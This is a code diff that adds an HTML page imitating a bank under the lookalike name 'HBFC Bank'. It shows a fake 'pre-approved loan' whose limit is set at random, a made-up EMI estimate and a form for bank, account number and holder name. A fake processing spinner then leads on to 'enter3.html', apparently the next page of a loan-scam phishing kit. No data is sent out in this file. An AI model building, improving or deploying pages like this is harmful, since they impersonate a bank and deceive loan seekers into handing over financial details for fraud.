@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HBFC Bank - Loan Approval</title>
+    <style>
+        :root {
+            --hbfc-blue: #004c8f;
+            --hbfc-red: #ed1c24;
+            --success-green: #28a745;
+        }
+        body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; background-color: #f0f2f5; color: #333; }
+        
+        /* Attractive Banner */
+        .congrats-banner {
+            background: linear-gradient(135deg, #004c8f, #007bff);
+            color: white;
+            padding: 40px 20px;
+            text-align: center;
+            border-bottom-left-radius: 40px;
+            border-bottom-right-radius: 40px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .congrats-banner h1 { margin: 0; font-size: 28px; }
+        .congrats-banner p { margin: 10px 0 0; opacity: 0.9; }
+
+        .container { padding: 20px; max-width: 500px; margin: -30px auto 0; }
+        .card { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); margin-bottom: 20px; }
+
+        .input-group { margin-bottom: 20px; }
+        label { display: block; font-size: 14px; color: #666; margin-bottom: 8px; font-weight: 600; }
+        
+        input, select {
+            width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box;
+        }
+        input:focus { border-color: var(--hbfc-blue); }
+
+        .emi-info { background: #eef7ff; padding: 15px; border-radius: 10px; border-left: 5px solid var(--hbfc-blue); margin-top: 10px; }
+        .emi-amount { font-size: 24px; color: var(--hbfc-blue); font-weight: bold; }
+
+        /* Bank List Modal */
+        #bankModal {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); z-index: 1000;
+        }
+        .modal-content {
+            background: white; width: 90%; max-width: 400px; margin: 50px auto; border-radius: 15px; padding: 20px; max-height: 80vh; overflow-y: auto;
+        }
+        .bank-item { padding: 12px; border-bottom: 1px solid #eee; cursor: pointer; }
+        .bank-item:hover { background: #f9f9f9; }
+
+        .error-border { border: 2px solid var(--hbfc-red) !important; }
+
+        .btn-collect {
+            background-color: var(--success-green); color: white; width: 100%; padding: 18px;
+            border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer;
+            margin-top: 10px; transition: 0.3s;
+        }
+        
+        /* Buffering Loader */
+        .loader { display: none; text-align: center; margin-top: 10px; }
+        .spinner {
+            width: 30px; height: 30px; border: 4px solid #f3f3f3; border-top: 4px solid var(--success-green);
+            border-radius: 50%; animation: spin 1s linear infinite; display: inline-block;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="congrats-banner">
+        <h1>Congratulations! 🎉</h1>
+        <p>You are eligible for a pre-approved loan.</p>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="input-group">
+                <label>Your Approved Loan Limit (Editable)</label>
+                <input type="number" id="finalAmount" placeholder="Enter Amount" oninput="calculateEMI()">
+            </div>
+
+            <div class="input-group">
+                <label>Select Loan Tenure (Time)</label>
+                <select id="tenure" onchange="calculateEMI()">
+                    <option value="6">6 Months</option>
+                    <option value="12">1 Year (12 Months)</option>
+                    <option value="24">2 Years</option>
+                    <option value="36">3 Years</option>
+                    <option value="48">4 Years</option>
+                    <option value="60">5 Years</option>
+                    <option value="84">7 Years</option>
+                    <option value="120">10 Years</option>
+                </select>
+            </div>
+
+            <div class="emi-info" id="emiResult">
+                <div style="font-size: 12px; color: #555;">Estimated Monthly EMI (10% Interest)</div>
+                <div class="emi-amount" id="emiDisplay">₹0</div>
+                <div style="font-size: 11px; margin-top: 5px; color: #28a745;" id="firstInstallmentDate"></div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="input-group">
+                <label>Select Your Bank</label>
+                <input type="text" id="bankSelect" readonly placeholder="Click to select bank" onclick="openBankModal()" style="cursor: pointer; background: #fafafa;">
+            </div>
+
+            <div class="input-group">
+                <label>Bank Account Number</label>
+                <input type="number" id="accNum" placeholder="Enter Account Number">
+            </div>
+
+            <div class="input-group">
+                <label>Confirm Account Number</label>
+                <input type="number" id="confAccNum" placeholder="Re-enter Account Number">
+            </div>
+
+            <div class="input-group">
+                <label>Account Holder Name</label>
+                <input type="text" id="holderName" placeholder="Name as per Bank">
+            </div>
+
+            <button class="btn-collect" onclick="processPayment()">COLLECT AMOUNT</button>
+            <div class="loader" id="buffer">
+                <div class="spinner"></div>
+                <p style="color: var(--success-green); font-size: 14px;">Processing your request...</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="bankModal">
+        <div class="modal-content">
+            <h3>Search Bank</h3>
+            <input type="text" id="bankSearch" placeholder="Search Bank Name..." onkeyup="filterBanks()">
+            <div id="bankList" style="margin-top: 15px;">
+                </div>
+            <button onclick="closeBankModal()" style="margin-top:15px; width: 100%; padding: 10px; border:none; background:#ccc; border-radius:5px;">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        const banks = ["State Bank of India", "HDFC Bank", "ICICI Bank", "Axis Bank", "Punjab National Bank", "Bank of Baroda", "Canara Bank", "Union Bank of India", "Kotak Mahindra Bank", "IndusInd Bank", "IDFC First Bank", "Yes Bank", "Indian Bank", "Bank of India", "Central Bank of India", "UCO Bank", "Bandhan Bank", "Standard Chartered"];
+
+        window.onload = function() {
+            // Amount Logic
+            let requested = parseInt(localStorage.getItem('userLoanAmount')) || 0;
+            let approved = 0;
+
+            if (requested <= 10000) approved = Math.floor(Math.random() * (80000 - 11000 + 1)) + 11000;
+            else if (requested <= 50000) approved = Math.floor(Math.random() * (80000 - 60000 + 1)) + 60000;
+            else if (requested <= 100000) approved = Math.floor(Math.random() * (150000 - 100000 + 1)) + 100000;
+            else approved = Math.floor(requested * 1.2);
+
+            document.getElementById('finalAmount').value = approved;
+            calculateEMI();
+            renderBanks();
+        };
+
+        function calculateEMI() {
+            const principal = parseFloat(document.getElementById('finalAmount').value) || 0;
+            const months = parseInt(document.getElementById('tenure').value);
+            const rate = 10 / 12 / 100; // 10% annual rate
+
+            if (principal > 0) {
+                // EMI Formula: [P x R x (1+R)^N]/[(1+R)^N-1]
+                const emi = (principal * rate * Math.pow(1 + rate, months)) / (Math.pow(1 + rate, months) - 1);
+                document.getElementById('emiDisplay').innerText = "₹" + Math.round(emi).toLocaleString('en-IN');
+                
+                // Date Logic: Current Month + 2 Months (1 month skip)
+                const d = new Date();
+                d.setMonth(d.getMonth() + 2);
+                d.setDate(1);
+                const monthNames = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+                document.getElementById('firstInstallmentDate').innerText = "First Installment starts from: 01 " + monthNames[d.getMonth()] + " " + d.getFullYear();
+            }
+        }
+
+        function openBankModal() { document.getElementById('bankModal').style.display = 'block'; }
+        function closeBankModal() { document.getElementById('bankModal').style.display = 'none'; }
+
+        function renderBanks() {
+            const list = document.getElementById('bankList');
+            list.innerHTML = "";
+            banks.forEach(bank => {
+                const div = document.createElement('div');
+                div.className = 'bank-item';
+                div.innerText = bank;
+                div.onclick = () => {
+                    document.getElementById('bankSelect').value = bank;
+                    closeBankModal();
+                };
+                list.appendChild(div);
+            });
+        }
+
+        function filterBanks() {
+            const term = document.getElementById('bankSearch').value.toLowerCase();
+            const items = document.querySelectorAll('.bank-item');
+            items.forEach(item => {
+                item.style.display = item.innerText.toLowerCase().includes(term) ? "block" : "none";
+            });
+        }
+
+        function processPayment() {
+            const acc = document.getElementById('accNum');
+            const conf = document.getElementById('confAccNum');
+            const holder = document.getElementById('holderName');
+            const bank = document.getElementById('bankSelect');
+            let isValid = true;
+
+            [acc, conf, holder, bank].forEach(el => el.classList.remove('error-border'));
+
+            if (acc.value === "" || conf.value === "" || acc.value !== conf.value) {
+                acc.classList.add('error-border');
+                conf.classList.add('error-border');
+                isValid = false;
+            }
+            if (holder.value === "") { holder.classList.add('error-border'); isValid = false; }
+            if (bank.value === "") { bank.classList.add('error-border'); isValid = false; }
+
+            if (!isValid) {
+                if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+            } else {
+                document.getElementById('buffer').style.display = 'block';
+                setTimeout(() => {
+                    window.location.href = "enter3.html";
+                }, 3000);
+            }
+        }
+    </script>
+</body>
+</html>
